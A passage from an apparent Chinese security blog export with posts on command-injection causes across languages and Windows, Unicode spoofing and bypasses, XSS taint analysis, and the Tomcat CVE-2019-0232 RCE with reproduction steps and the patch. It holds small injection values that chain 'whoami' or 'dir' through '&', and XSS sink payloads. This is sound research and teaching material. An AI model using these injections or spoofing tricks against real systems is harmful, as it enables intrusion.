r1, [26]LdaUndefined Return 一种方式是可以在Chrome中开启调试，可以清晰的看到局部与全局两种作用域。 0x3 参考链接 v8 interpreter-generator.cc 深入理解JS中声明提升、作用域（链）和this关键字","categories":[{"name":"Misc","slug":"Misc","permalink":"https://blog.lyle.ac.cn/categories/Misc/"}],"tags":[{"name":"Tricks","slug":"Tricks","permalink":"https://blog.lyle.ac.cn/tags/Tricks/"}]},{"title":"命令注入成因小谈","slug":"cmdi","date":"2019-10-19T01:23:51.000Z","updated":"2023-04-06T02:11:31.969Z","comments":true,"path":"2019/10/19/cmdi/","link":"","permalink":"https://blog.lyle.ac.cn/2019/10/19/cmdi/","excerpt":"最近做测试的时候，发现不同平台&#x2F;语言下命令注入的结果会有一定的不同，于是尝试对命令注入的成因做了一个更细致的探索。","text":"最近做测试的时候，发现不同平台&#x2F;语言下命令注入的结果会有一定的不同，于是尝试对命令注入的成因做了一个更细致的探索。 语言实现PHPPHP命令执行的函数很多，其中大部分函数的实现都在 php-src/ext/standard/exec.c 中: system exec passthru proc_open shell_exec 其中 system &#x2F; exec &#x2F; passthru 的实现调用链都是 php_exec_ex -&gt; php_exec -&gt; VCWD_POPEN 。 proc_open 的实现在 php-src/ext/standard/proc_open.c 中，调用 execle / execl 执行 /bin/sh -c 。 popen的实现在 php-src/ext/standard/file.c 中，和 shell_exec 一样直接调用 VCWD_POPEN 。 pcntl_exec 的实现在 php-src/ext/pcntl/pcntl.c 中，调用 execve 执行 /bin/sh -c。 而 VCWD_POPEN 定义在 Zend\\zend_virtual_cwd.h 中，根据编译配置有两种实现： 123#define VCWD_POPEN(command, type) virtual_popen(command, type)// or#define VCWD_POPEN(command, type) popen(command, type) 其中 virtual_popen 在 Zend/zend_virtual_cwd.c 中 1234CWD_API FILE *virtual_popen(const char *command, const char *type) /* &#123;&#123;&#123; */&#123; return popen_ex(command, type, CWDG(cwd).cwd, NULL);&#125; 所以PHP中的命令执行大都只是对popen做了不同程度和形式的封装。 可以用下面这个小demo来做简单验证： 123456789101112131415161718192021222324252627&lt;?phpsystem(&#x27;id&#x27;);echo exec(&#x27;id&#x27;);passthru(&#x27;id&#x27;);echo shell_exec(&#x27;id&#x27;);$descriptorspec = array( 0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;), 1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;), 2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;));$process = proc_open(&#x27;id&#x27;, $descriptorspec, $pipes);if (is_resource($process)) &#123; echo stream_get_contents($pipes[1]); fclose($pipes[1]); $return = proc_close($process);&#125;$handle = popen(&#x27;/usr/bin/id 2&gt;&amp;1&#x27;, &#x27;r&#x27;);$read = fread($handle, 4096);echo $read;pclose($handle);pcntl_exec(&#x27;/usr/bin/id&#x27;); 执行 strace -f -e trace=execve php 1.php 可以看到6次 execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;... 的调用。 JavaJava执行系统命令使用 Runtime.getRuntime().exec 。JDK实现 Runtime.getRuntime().exec 实际调用了 ProcessBuilder ，而后 ProcessBuilder 调用 ProcessImpl 使用系统调用 vfork ，把所有参数直接传递至 execve 。 但是和PHP不同的是，Java并没有调用 popen ，也没有给 execve 传入 sh -c ，而是直接把参数传递至 execve 。 一个简单的demo如下 123456789101112131415161718192021import java.io.*;public class Main &#123; public static void main(String[] args) &#123; String [] cmd=&#123;&quot;/usr/bin/id&quot;, &quot;&amp;&amp;&quot;, &quot;/usr/bin/id&quot;&#125;; try &#123; Process proc = Runtime.getRuntime().exec(cmd); InputStream fis = proc.getInputStream(); InputStreamReader isr = new InputStreamReader(fis); BufferedReader br = new BufferedReader(isr); String line = null; while((line=br.readLine()) != null) &#123; System.out.println(line); &#125; &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; 用 strace -f -e vfork,execve java Main 跟踪可以看到上面的Java代码在Linux中调用为 1execve(&quot;/usr/bin/id&quot;, [&quot;/usr/bin/id&quot;, &quot;&amp;&amp;&quot;, &quot;/usr/bin/id&quot;], [/* 22 vars */] Python跟踪程序的具体实现需要相对多的精力和时间，有一个相对简单的方式是直接使用 strace 跟踪，例如Python常用的调用是 os.system 和 subprocess.check_output 。 12345import osimport subprocessos.system(&#x27;id&#x27;)subprocess.check_output(&#x27;id&#x27;) 那么执行 strace -f -e vfork,execve python t.py ，可以发现 system 对应 execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;id&quot;] ，而 subprocess.check_output 对应 execve(&quot;/usr/bin/id&quot; 。 系统调用简单对语言实现层面做了一个了解后，不难看出，大部分语言在Linux平台下，系统调用会调用 popen ，而Windows平台下则是 CreateProcess ，而 popen 和 CreateProcess 的实现则是造成不同场景下命令注入有轻微不同的原因。 popenpopen是libc中的函数，当前版本的glibc中，popen的实现在 libio/iopopen.c 中的 _IO_new_popen 函数。这个函数的调用链是： _IO_new_popen -&gt; _IO_new_proc_open -&gt; spawn_process -&gt; __posix_spawn 最后调用了 sh -c 。 sh -c 会将之后传入的字符串当作命令执行，所以在没有做过滤的情况下，PHP的系统调用，Python的 os.system 都会出现问题。 这里有一个细节是，sh会指向 /bin/sh ，在当前版本的Linux中，/bin/sh 默认指向 /bin/dash 。 dash 编译文件的大小大概在150k左右，而我们常用的 bash 大小在 1000k 左右，很直觉的，bash 的功能会更丰富一些。 例如 dash 中没有 function 关键字支持，不支持 here string，不支持 数组，dash 不支持 ++ 操作符等，这会在一些利用了bash特性的复杂payload中造成一些不同。 还有一点需要注意的是虽然 Windows 中也提供了 _popen 作为POSIX的兼容，但是在Windows平台中， _popen 最后调用的是 CreateProcess ，因而与 Linux 平台下的表现有一定的出入。 CreateProcess上面提到在Windows中，调用链的底层会最后创建进程使用的是 CreateProcess ，在普通情况下，这个函数即使不转义也不会出现问题，但是根据Windows文档，当 CreateProcess 中的第一个参数为 bat 文件或是 cmd 文件时，会调用 cmd.exe 。所以当调用的参数第一个是bat文件时，会变成类似 cmd.exe /c &quot;test.bat &amp; id&quot; 的调用，这样就会和 sh -c 一样引入了命令注入的潜在可能。 例如 String [] cmd=&#123;&quot;whoami&quot;, &quot;&amp;&quot;, &quot;whoami&quot;&#125;; 并不会正确执行，这里相当于把 &amp; 作为了 whoami 的参数传递了。而 String [] cmd=&#123;&quot;sth.bat&quot;, &quot;&amp;&quot;, &quot;whoami&quot;, &quot;&amp;&quot;, &quot;whoami&quot;&#125;; 则会执行两次 whoami 。 还有一个需要注意的特性是，和Linux不同，Windows在处理参数方面有一个特性，如果这里只加上简单的转义还是可能被绕过。例如 &lt;?php system(&#39;dir &quot;\\&quot;&amp;whoami&quot;&#39;); 在Linux中会报错，而在Windows会执行 dir 和 whoami 两条命令。 这是因为Windows在处理命令行参数时，会将 &quot; 中的内容拷贝为下一个参数，直到命令行结束或者遇到下一个 &quot; ，但是对 \\&quot; 的处理有误。因此在调用批处理或者cmd文件时，需要做合适的参数检查才能避免漏洞出现。 参考链接 git:&#x2F;&#x2F;git.kernel.org&#x2F;pub&#x2F;scm&#x2F;utils&#x2F;dash&#x2F;dash.git http://git.savannah.gnu.org/cgit/bash.git/ https://hg.openjdk.java.net/jdk/jdk https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/popen-wpopen?view=vs-2019 https://blogs.msdn.microsoft.com/twistylittlepassagesallalike/2011/04/23/everyone-quotes-command-line-arguments-the-wrong-way/","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.lyle.ac.cn/categories/Web/"}],"tags":[{"name":"Command Injection","slug":"Command-Injection","permalink":"https://blog.lyle.ac.cn/tags/Command-Injection/"}]},{"title":"浅谈Unicode设计的安全性","slug":"unicode-sec-1","date":"2019-06-18T14:41:40.000Z","updated":"2023-04-06T02:11:31.969Z","comments":true,"path":"2019/06/18/unicode-sec-1/","link":"","permalink":"https://blog.lyle.ac.cn/2019/06/18/unicode-sec-1/","excerpt":"1. 简介1.1 编码在1963年，计算机使用尚不广泛，主要使用7-bit的ASCII编码（American Standard Code for Information Interchange，美国信息互换标准代码）来作为字符的编码，只支持常用的少数一些字符。但是随着计算机的不断普及，各个国家和地区开始制造自己的编码规范，同时互相不进行兼容，编码逐渐成为了一个问题。","text":"1. 简介1.1 编码在1963年，计算机使用尚不广泛，主要使用7-bit的ASCII编码（American Standard Code for Information Interchange，美国信息互换标准代码）来作为字符的编码，只支持常用的少数一些字符。但是随着计算机的不断普及，各个国家和地区开始制造自己的编码规范，同时互相不进行兼容，编码逐渐成为了一个问题。 1.2 Unicode而后ISO(International Organization for Standardization, 国际标准化组织) 开始尝试制定包含大部分字母和符号的编码，称为”Universal Multiple-Octet Coded Character Set”，简称UCS, 俗称Unicode。 Unicode实际上是一个字符和数字之间的映射关系表，并不制定实际的编码方案。因此又开始制定UTF(Unicode Transformation Formats)标准，包括UTF-8、UTF-16和UTF-32等。可以理解为Unicode是一个设计图，而UTF-X是其中一种实现。 1.3 Code Point 与 Code UnitCode Point指Unicode标准里字符的编号，比如用目前Unicode使用了0 ~ 0x10FFFF的编码范围，通常用U+xxxx来表示某个字符。 Code Unit指某种Unicode编码方式里编码一个Code Point需要的最少字节数，比如UTF-8需要最少一个字节，UTF-16 最少两个字节，UCS-2两个字节，UCS-4和UTF-32四个字节，后面三个是定长编码。 2. 视觉欺骗视觉欺骗问题是最常见的也是考虑最多的Unicode安全问题。视觉问题一般指几个不同的不同的字符在某个字体下看起来较为相同。可能是字符之间一对一相似、多个字符的组合字符和一个字符相似等，这种现象在字体较小的情况下会更加明显，在一些文章中这种问题也被称为同形异义词(homographs)问题。 2.1 国际化域名国际化域名（Internationalized Domain Name，IDN）又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名，包括中文、法语、阿拉伯语、希伯来语或拉丁字母等非英文字母，这些文字经多字节万国码编码而成。 因为浏览器对国家化域名的支持，这就使得可以出现 аррӏе.com (其中I是U+04CF) 这样的域名。在地址栏中，这样的域名看上去会和 apple.com 比较相似。 注: 这个例子在Chrome中已经被修复，但是Firefox中仍然生效。 同样在Url中，一些看上去和控制字符类似的Unicode也会造成问题，例如 / 和 ⁄ (U+2044)看起来就很相似，example.com⁄evil.com 实际上是 com⁄evil.com 的子域名。同样的 ? &#x2F; . &#x2F; # 等类似字符也存在这样的问题。 除了上面提到的两种情况，punycode也是一种视觉欺骗的形式，punycode是域名的一种编码，会以 xn-- 开头，后面是普通的有效域名，例如 аррӏе.com 对应的punycode就是 xn--80ak6aa92e.com。当chrome认为这是一个视觉问题时，就会主动把域名以punycode显示，以减少混淆的影响。但是反过来，也能应用这种方式来实现视觉欺骗，例如 䕮䕵䕶䕱.com 的punycode形式就是 xn--google.com。 2.2 双向显示阿拉伯和希伯来语是从右往左阅读的，这在一些场景下可能造成问题。例如一个名为 txt.exe ，加入Unicode的控制字符后，在用户界面看起来是 exe.txt ，这样就有可能导致用户的误判。 2.3 数字显示一些国家的数字在显示的时候也可能造成问题，例如孟加拉语的0-9是০ ১ ২ ৩ ৪ ৫ ৬ ৭ ৮ ৯，但是这里的৪ (U+09EA) 实际上是数字4。ASIS CTF 2019 的 Unicorn Shop 也是从Unicode背后的数字角度出发考虑问题。 3. 非视觉漏洞除了视觉漏洞之外，还有很多其他方面的漏洞。这些问题主要字符是转换导致的字符串。关于字符串处理转换的细节，可以参考我之前的这篇文章。 3.1 等价形式在WAF类处理，很容易想到的是 LocalHost 和 localhost 等同，但是 ⓛocaⓛhost 这种情景就不太容易被处理。在SSRF中的防御中，如果没有做对应的处理，这种替换就可以完成一些bypass。 3.2 字符删除例如 \\x3c\\x73\\x63\\x72\\xc2\\x69\\x70\\x74\\x3e 这个字符串中，而 \\xc2 并不是任何一个有效字符的子串，在一些处理逻辑中，可能会删除 \\xc2 这个字符，从而导致问题。 3.3 字符替换一些情况下，字符会被替换为其他的字符 如U+FFFF会被替换成 ? 这在一些 ? 有明确语义的情况下就会出现问题。 3.4 缓冲区溢出在一些大小写转换时，字符会变多，例如 &#39;ß&#39;.toUpperCase() 的运行结果是 SS。如果字符串的长度检查在大小写转换之前，就可能会存在缓冲区溢出问题。 4. 参考链接 Unicode CLDR Unicode Security Considerations Unicode Security Mechanisms Unicode isn’t harmful for health – Unicode Myths debunked and encodings demystified Unicode Security Guide 其实你并不懂 Unicode IDN Spoof漏洞自动化挖掘 Unicode等价性浅谈 Unicode Security Issues FAQ IDN Visual Security Deep Thinking ASIS CTF 2019 Unicorn Shop Write-up Black Hat","categories":[{"name":"Misc","slug":"Misc","permalink":"https://blog.lyle.ac.cn/categories/Misc/"}],"tags":[{"name":"Unicode","slug":"Unicode","permalink":"https://blog.lyle.ac.cn/tags/Unicode/"}]},{"title":"基于污点分析的XSS漏洞辅助挖掘的一种方式","slug":"xss-auto","date":"2019-06-12T02:37:07.000Z","updated":"2023-04-06T02:11:31.969Z","comments":true,"path":"2019/06/12/xss-auto/","link":"","permalink":"https://blog.lyle.ac.cn/2019/06/12/xss-auto/","excerpt":"序我在之前的一篇文章中简单讲解了Web应用代码自动化审计的几种实现方式。 这篇文章以自动化辅助挖掘XSS漏洞漏洞为例，简单的讲解一个实际的灰盒分析实现的例子。","text":"序我在之前的一篇文章中简单讲解了Web应用代码自动化审计的几种实现方式。 这篇文章以自动化辅助挖掘XSS漏洞漏洞为例，简单的讲解一个实际的灰盒分析实现的例子。 在上文中有提到到，漏洞可以认为是输入到危险函数的过程，所以这篇文章涉及到的主要是输入、危险函数、具体实现这三个部分。 输入作为污点来源的输入主要考虑当前状态、网络请求和存储函数三个来源。 当前状态主要指像窗口名、当前Url、Hash、referr等，具体对应如下这些变量： window.name window.location.href window.location.search window.location.hash window.location.pathname window.location.url document.URL document.documentURI document.URLUnencoded document.baseURI document.referrer 网络请求主要指使用异步方式获取的请求及其响应，这部分可以通过hook XMLHttpRequest fetch 等API来获取。 存储主要指Cookie、Indexdb、localStorage、sessionStorage等。 部分输入在网页初始化时已经确定，这部分由程序记录下来。部分输入会不断变化，如cookie等，这部分输入会通过插桩、事件处理等方式进行监控，并实时对变化进行记录。 危险函数这里把危险函数分为直接执行JavaScript、加载URL、执行HTML、创建元素、部分可控执行五类，具体涉及到的函数与相关模式如下。 直接执行JavaScript这类危险函数直接把输入以JavaScript代码的形式执行，例如。 eval(payload) setTimeout(payload, 100) setInterval(payload, 100) Function(payload)() &lt;script&gt;payload&lt;/script&gt; &lt;img src=x onerror=payload&gt; 加载URL这类危险函数以URL加载的形式执行JavaScript代码，但是大体和JavaScript类似。 location=javascript:alert(/xss/) location.href=javascript:alert(/xss/) location.assign(javascript:alert(/xss/)) location.replace(javascript:alert(/xss/)) 执行HTML这类危险函数直接把输入以HTML代码的形式执行，在一定情况下可以执行代码。 xx.innerHTML=payload xx.outerHTML=payload document.write(payload) document.writeln(payload) 创建元素这类调用大多是创建一个DOM元素，并将其加入页面中。当script的源可控或者元素的构造可控的时候，可能会出现问题。 scriptElement.src domElement.appendChild domElement.insertBefore domElement.replaceChild 部分可控执行这类调用存在一定的动态成分，可控的程度不高，但是在部分情况下存在价值，因此在工具中加入了对其的监控。 (new Array()).reduce(func) (new Array()).reduceRight(func) (new Array()).map(func) (new Array()).filter(func) 整体架构污点追踪污点追踪的实现有两种思路，一种思路是hook浏览器native的实现，但是这种方法要求对浏览器本身的实现机制有比较好的了解，而且编译过程复杂，很难迁移。浏览器一旦更新，就需要修改大量的代码来适应。 另外一种思路是基于浏览器插件做JavaScript层的Hook，这种方式虽然没有浏览器源代码层的hook底层，但是开发更快，更容易迁移，在有新的机制出现时也比较容易适应。 Chrome插件中，代码分在content-script、background、popup等运行时中。其中只有content-script可以操纵宿主页面的DOM，但是宿主页面JavaScript和content-script也在不同的沙箱中，无法hook，只能使用注入的方式。 在hook后，当出现危险函数的调用或网络请求时，则将其记录至后台。 疑似利用确认和很多漏洞不同，大部分存储型的漏洞是没有回显的，因此需要做一定的确认工作。 在获取信息后，以域名为单位。遍历sink和source，查找重合的地方。如果source在sink的参数中出现，就可能是漏洞点。需要注意的是，除了hash之外，网络请求等各种参数不一定可控。另外，需要去除同一域名下，同一参数同一调用的Sink，同一源和同一返回的结果，减少重复数据。 在具体确认的时候，考虑到，sink中的参数可能是source的一部分，source中也可能只是sink的一部分，因此使用公共子字符串算法，只要字串的长度小于sink和source最小的长度。 不过即使完全可控，也可能出现waf、sanitizer、难以绕过的csp策略等。因此这种方法会有比较高的误报率，但是相对的，在hook较全的情况下，漏报率会小很多。 除了上面提到的这种方式，工具还采取了动态污染的方式。通过修改请求参数和修改函数调用时的参数两种方式，传入一些测试性的payload，如果在返回界面获取到了相信的结果，那么漏洞就是存在的。 结果查看这里考虑过直接用插件自带的界面popup &#x2F; background来显示可能的结果，用浏览器层的localstorge存储数据，但是考虑这种方式会影响浏览器间迁移的兼容性。 于是最后单独用vuejs + django编写了一个小的站点来接收请求，查看结果。 参考链接 基于chrome扩展的脚本注入工具 让前端监控数据采集更高效","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.lyle.ac.cn/categories/Web/"}],"tags":[{"name":"自动化","slug":"自动化","permalink":"https://blog.lyle.ac.cn/tags/%E8%87%AA%E5%8A%A8%E5%8C%96/"},{"name":"XSS","slug":"XSS","permalink":"https://blog.lyle.ac.cn/tags/XSS/"}]},{"title":"CVE-2019-0232：Apache Tomcat RCE漏洞分析","slug":"cve-2019-0232","date":"2019-04-20T04:43:30.000Z","updated":"2023-04-06T02:11:31.969Z","comments":true,"path":"2019/04/20/cve-2019-0232/","link":"","permalink":"https://blog.lyle.ac.cn/2019/04/20/cve-2019-0232/","excerpt":"简述利用前提该漏洞是由于Tomcat CGI将命令行参数传递给Windows程序的方式存在错误，使得CGIServlet被命令注入影响。 该漏洞只影响Windows平台，要求启用了CGIServlet和enableCmdLineArguments参数。但是CGIServlet和enableCmdLineArguments参数默认情况下都不启用。","text":"简述利用前提该漏洞是由于Tomcat CGI将命令行参数传递给Windows程序的方式存在错误，使得CGIServlet被命令注入影响。 该漏洞只影响Windows平台，要求启用了CGIServlet和enableCmdLineArguments参数。但是CGIServlet和enableCmdLineArguments参数默认情况下都不启用。 时间线 报告漏洞 2019-3-3 漏洞公开 2019-4-10 漏洞影响范围 Apache Tomcat 9.0.0.M1 to 9.0.17 Apache Tomcat 8.5.0 to 8.5.39 Apache Tomcat 7.0.0 to 7.0.93 复现笔者使用的复现环境为9.0.12 + JRE 1.8.0。 首先进行CGI相关的配置，在 conf/web.xml 中启用CGIServlet： 1234567891011121314151617&lt;servlet&gt; &lt;servlet-name&gt;cgi&lt;/servlet-name&gt; &lt;servlet-class&gt;org.apache.catalina.servlets.CGIServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;cgiPathPrefix&lt;/param-name&gt; &lt;param-value&gt;WEB-INF/cgi-bin&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;enableCmdLineArguments&lt;/param-name&gt; &lt;param-value&gt;true&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;executable&lt;/param-name&gt; &lt;param-value&gt;&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;5&lt;/load-on-startup&gt;&lt;/servlet&gt; 这里主要的设置是 enableCmdLineArguments 和 executable 两个选项。 enableCmdLineArguments 启用后才会将Url中的参数传递到命令行， executable 指定了执行的二进制文件，默认是 perl，需要置为空才会执行文件本身。 同样在 conf/web.xml 中启用cgi的servlet-mapping 1234&lt;servlet-mapping&gt; &lt;servlet-name&gt;cgi&lt;/servlet-name&gt; &lt;url-pattern&gt;/cgi-bin/*&lt;/url-pattern&gt;&lt;/servlet-mapping&gt; 之后修改 conf/context.xml 的 &lt;Context&gt; 添加 privileged=&quot;true&quot;属性，否则会没有权限 12345678910111213&lt;Context privileged=&quot;true&quot;&gt; &lt;!-- Default set of monitored resources. If one of these changes, the --&gt; &lt;!-- web application will be reloaded. --&gt; &lt;WatchedResource&gt;WEB-INF/web.xml&lt;/WatchedResource&gt; &lt;WatchedResource&gt;WEB-INF/tomcat-web.xml&lt;/WatchedResource&gt; &lt;WatchedResource&gt;$&#123;catalina.base&#125;/conf/web.xml&lt;/WatchedResource&gt; &lt;!-- Uncomment this to disable session persistence across Tomcat restarts --&gt; &lt;!-- &lt;Manager pathname=&quot;&quot; /&gt; --&gt;&lt;/Context&gt; 然后在 ROOT\\WEB-INF 下创建 cgi-bin 目录, 并在该目录下创建一个内容为 echo Content-type: text/html 的 e.bat 文件。 配置完成后，启动tomcat，访问 http://127.0.0.1:8080/cgi-bin/e.bat?&amp;ver ，可以看到命令执行成功。 原理漏洞相关的代码在 tomcat\\java\\org\\apache\\catalina\\servlets\\CGIServlet.java 中，CGIServlet提供了一个cgi的调用接口，在启用 enableCmdLineArguments 参数时，会根据RFC 3875来从Url参数中生成命令行参数，并把参数传递至Java的 Runtime 执行。 这个漏洞是因为 Runtime.getRuntime().exec 在Windows中和Linux中底层实现不同导致的。下面以一个简单的case来说明这个问题，在Windows下创建arg.bat： 12rem arg.batecho %* 并执行如下的Java代码 12String [] cmd=&#123;&quot;arg.bat&quot;, &quot;arg&quot;, &quot;&amp;&quot;, &quot;dir&quot;&#125;;Runtime.getRuntime().exec(cmd); 在Windows下会输出 arg 和 dir 命令运行后的结果。同样的，用类似的脚本在Linux环境下测试： 12345# arg.shfor key in &quot;$@&quot;do echo &#x27;$@&#x27; $keydone 12String [] cmd=&#123;&quot;arg.sh&quot;, &quot;arg&quot;, &quot;&amp;&quot;, &quot;dir&quot;&#125;;Runtime.getRuntime().exec(cmd); 此时的输出为 123$@ arg$@ &amp;$@ dir 导致这种输出的原因是在JDK的实现中 Runtime.getRuntime().exec 实际调用了 ProcessBuilder ，而后 ProcessBuilder 调用 ProcessImpl使用系统调用 vfork ，把所有参数直接传递至 execve。 用 strace -F -e vfork,execve java Main 跟踪可以看到上面的Java代码在Linux中调用为 1execve(&quot;arg.sh&quot;, [&quot;arg.sh&quot;, &quot;arg&quot;, &quot;&amp;&quot;, &quot;dir&quot;], [/* 23 vars */]) 而如果跟踪类似的PHP代码 system(&#39;arg.sh arg &amp; dir&#39;); ，得到的结果为 1execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;arg.sh arg &amp; dir&quot;], [/* 23 vars */]) 所以Java的 Runtime.getRuntime().exec 在CGI调用这种情况下很难有命令注入。 Windows中创建进程使用的是 CreateProcess ，会将参数合并成字符串，作为 lpComandLine 传入 CreateProcess 。程序启动后调用 GetCommandLine 获取参数，并调用 CommandLineToArgvW 传至 argv。在Windows中，当 CreateProcess 中的参数为 bat 文件或是 cmd 文件时，会调用 cmd.exe , 故最后会变成 cmd.exe /c &quot;arg.bat &amp; dir&quot;，而Java的调用过程并没有做任何的转义，所以在Windows下会存在漏洞。 除此之外，Windows在处理参数方面还有一个特性，如果这里只加上简单的转义还是可能被绕过， 例如 dir &quot;\\&quot;&amp;whoami&quot; 在Linux中是安全的，而在Windows会执行命令。 这是因为Windows在处理命令行参数时，会将 &quot; 中的内容拷贝为下一个参数，直到命令行结束或者遇到下一个 &quot; ，但是对 \\&quot; 的处理有误。同样用 arg.bat 做测试，可以发现这里只输出了 \\ 。因此在Java中调用批处理或者cmd文件时，需要做合适的参数检查才能避免漏洞出现。 修复方式开发者在 patch 中增加了 cmdLineArgumentsDecoded 参数，这个参数用来校验传入的命令行参数，如果传入的命令行参数不符合规定的模式，则不执行。 校验写在 setupFromRequest 函数中： 123456789String decodedArgument = URLDecoder.decode(encodedArgument, parameterEncoding);if (cmdLineArgumentsDecodedPattern != null &amp;&amp; !cmdLineArgumentsDecodedPattern.matcher(decodedArgument).matches()) &#123; if (log.isDebugEnabled()) &#123; log.debug(sm.getString(&quot;cgiServlet.invalidArgumentDecoded&quot;, decodedArgument, cmdLineArgumentsDecodedPattern.toString())); &#125; return false;&#125; 不通过时，会将 CGIEnvironment 的 valid 参数设为 false ，在之后的处理函数中会直接跳过执行。 1234567891011121314if (cgiEnv.isValid()) &#123; CGIRunner cgi = new CGIRunner(cgiEnv.getCommand(), cgiEnv.getEnvironment(), cgiEnv.getWorkingDirectory(), cgiEnv.getParameters()); if (&quot;POST&quot;.equals(req.getMethod())) &#123; cgi.setInput(req.getInputStream()); &#125; cgi.setResponse(res); cgi.run();&#125; else &#123; res.sendError(404);&#125; 修复建议 使用更新版本的Apache Tomcat。这里需要注意的是，虽然在9.0.18就修复了这个漏洞，但这个更新是并没有通过候选版本的投票，所以虽然9.0.18没有在被影响的列表中，用户仍需要下载9.0.19的版本来获得没有该漏洞的版本。 关闭enableCmdLineArguments参数 参考链接 https://tomcat.apache.org/security-9.html https://tomcat.apache.org/tomcat-9.0-doc/cgi-howto.html https://github.com/apache/tomcat/commit/4b244d8 https://github.com/pyn3rd/CVE-2019-0232/ https://tools.ietf.org/html/rfc3875 https://blogs.msdn.microsoft.com/twistylittlepassagesallalike/2011/04/23/everyone-quotes-command-line-arguments-the-wrong-way/ https://codewhitesec.blogspot.com/2016/02/java-and-command-line-injections-in-windows.html https://blog.trendmicro.com/trendlabs-security-intelligence/uncovering-cve-2019-0232-a-remote-code-execution-vulnerability-in-apache-tomcat","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.lyle.ac.cn/categories/Web/"}],"tags":[{"name":"CVE","slug":"CVE","permalink":"https://blog.lyle.ac.cn/tags/CVE/"}]},{"title":"Web应用代码自动化审计浅谈","slug":"Web-Application-Auto-Audit","date":"2019-04-06T10:17:22.000Z","updated":"2023-04-06T02:11:31.969Z","comments":true,"path":"2019/04/06/Web-Application-Auto-Audit/","link":"","permalink":"https://blog.lyle.ac.cn/2019/04/06/Web-Application-Auto-Audit/","excerpt":"0. 序代码审计是找到应用缺陷的过程。自动化审计通常有白盒、黑盒、灰盒等多种方式。白盒指通过对源代码的分析找到应用缺陷；黑盒通常不涉及到源代码，多使用模糊测试等方式来找到漏洞；而灰盒则是黑白结合的方式，利用黑盒特性来减少白盒的计算复杂度，使用白盒的信息来衡量漏洞的有效性。","text":"0. 序代码审计是找到应用缺陷的过程。自动化审计通常有白盒、黑盒、灰盒等多种方式。白盒指通过对源代码的分析找到应用缺陷；黑盒通常不涉及到源代码，多使用模糊测试等方式来找到漏洞；而灰盒则是黑白结合的方式，利用黑盒特性来减少白盒的计算复杂度，使用白盒的信息来衡量漏洞的有效性。 1. 基础概念1.1 输入 (Source)Web应用的输入，可以是请求的参数（GET、POST等）、上传的文件、Cookie、数据库数据等用户可控或者间接可控的地方。 例如PHP中的 $_GET &#x2F; $_POST &#x2F; $_REQUEST &#x2F; $_COOKIE &#x2F; $_FILES &#x2F; $_SERVER 等，都可以作为应用的输入。 1.2 处理函数 (Filter)处理函数是对数据进行过滤或者编解码的函数。这些函数会对输入造成影响，为漏洞利用带来不确定性。 同样以PHP为例，这样的函数可能是 mysqli_real_escape_string &#x2F; htmlspecialchars &#x2F; base64_encode &#x2F; str_rot13 等，也可能是应用自定义的过滤函数。 1.3 危险函数 (Sink)危险函数又常叫做Sink Call、漏洞点，是可能触发危险行为如文件操作、命令执行、数据库操作等行为的函数。 在PHP中，可能是 include &#x2F; system &#x2F; echo 等。 1.4 问题定义一般认为一个漏洞的触发过程是从输入经过过滤到危险函数的过程(Source To Sink)，而自动化审计就是寻找这个链条的过程。自动化审计的难点主要在于以下几个方面。 1.4.1 输入多样化对Web应用来说，可能的输入可以来自GET&#x2F;POST的参数、Cookie、Url等多个地方，这些输入格式不固定，输入空间很大。 1.4.2 过滤函数复杂在审计的过程中，从输入没有经过任何过滤函数就到达危险函数的过程较少。但是自动化判断一些过滤数是否可以绕过较为困难。 1.4.3 代码本身的复杂度现代Web框架，代码复杂度极高，有相当多的动态加载和调用的过程，为自动化分析带来了困难。 2. 技术基础2.1 抽象语法树抽象语法树，顾名思义，是一种树形的数据结构。构造AST树的基本方法是将表达式的操作数作为树结构的叶子，将表达式的操作符号作为树结构的根，依次循环迭代进行构造。 例如在JavaScript中， a=1 的抽象语法树如下： 123456789101112131415161718192021222324&#123; &quot;type&quot;: &quot;Program&quot;, &quot;body&quot;: [ &#123; &quot;type&quot;: &quot;ExpressionStatement&quot;, &quot;expression&quot;: &#123; &quot;type&quot;: &quot;AssignmentExpression&quot;, &quot;operator&quot;: &quot;=&quot;, &quot;left&quot;: &#123; &quot;type&quot;: &quot;Identifier&quot;, &quot;name&quot;: &quot;a&quot; &#125;, &quot;right&quot;: &#123; &quot;type&quot;: &quot;Literal&quot;, &quot;value&quot;: 1, &quot;raw&quot;: &quot;1&quot; &#125; &#125; &#125;], &quot;sourceType&quot;: &quot;script&quot;&#125; 2.2 程序控制流图AST树依旧是比较高层次的形式，其中模块之间的调用、循环等依旧不利于数据流的处理，因此引入了更底层的程序控制流图来进行分析。 程序控制流图(Control Flow Graph，CFG)是静态分析过程中的另一种状态，可以反映程序代码控制流程。其实，程序控制流图是由一个入口、若干个出口组成的有向图，图中的每一个节点代表一个基本块，基本块中可以有一系列顺序执行的语句；图中的有向边，代表从出发节点到目标节点的控制依赖关系。 3. 解决方案3.1 危险函数匹配白盒审计最常见的方式是通过查找危险函数来定位漏洞，比较有代表性的工具是Seay开发的审计工具。这个工具直接找出所有危险函数的位置，这种方式没有对调用流程进行深入分析，相对误报率会比较高。 不过同样的，这种方式在一些环境下能做到几乎无漏报，只要审计者有耐心，可以发现应用大部分的漏洞，但是在高度框架化的代码中，这种方式能找到的漏洞相对有限。 3.2 代码相似性比对一些开发者会复制其他框架的代码，或者使用各种框架。如果事先有建立对应的漏洞图谱，则可使用相似性方法来找到漏洞。 3.3 